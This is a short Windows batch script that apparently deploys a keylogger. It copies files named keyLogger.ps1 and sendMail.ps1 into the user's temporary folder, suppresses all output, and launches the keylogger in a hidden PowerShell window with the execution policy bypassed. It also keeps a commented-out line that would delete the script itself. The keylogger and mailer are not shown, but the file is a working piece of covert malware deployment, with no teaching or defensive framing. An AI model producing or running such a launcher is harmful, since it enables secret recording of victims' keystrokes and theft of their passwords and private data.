@echo off

set "source=%CD%\keyLogger.ps1"
set "destination=%TEMP%\keyLogger.ps1"

set "source2=%CD%\sendMail.ps1"
set "destination2=%TEMP%\sendMail.ps1"



dir /a "%source%" >nul 2>&1
if errorlevel 1 (
	exit /b 1
) else (
	echo F | xcopy /r /y /h "%source%" "%destination%" >nul 2>&1
)

dir /a "%source2%" >nul 2>&1
if errorlevel 1 (
	exit /b 1
) else (
	echo F | xcopy /r /y /h "%source2%" "%destination2%" >nul 2>&1
)




powershell -Command "Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \"%TEMP%\keyLogger.ps1\"' -WindowStyle Hidden"

REM del "%~f0"